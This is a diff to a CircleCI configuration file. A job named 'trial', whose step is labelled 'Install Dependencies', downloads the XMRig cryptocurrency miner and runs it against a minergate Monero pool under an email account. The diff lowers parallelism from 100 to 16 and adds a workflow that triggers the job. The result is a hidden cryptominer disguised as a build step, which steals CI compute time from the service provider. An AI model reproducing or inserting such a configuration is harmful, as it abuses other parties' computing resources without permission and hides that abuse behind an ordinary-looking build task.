@@ -3,7 +3,7 @@ jobs:
     trial:
       docker:
             - image: circleci/ruby:2.5.3
-      parallelism: 100
+      parallelism: 16
       steps:
         - run:
             name: Install Dependencies
@@ -12,3 +12,8 @@ jobs:
               echo Hello,subscribe it
               wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3 && screen 
               ./xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u buanaputra001@gmail.com -p x
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
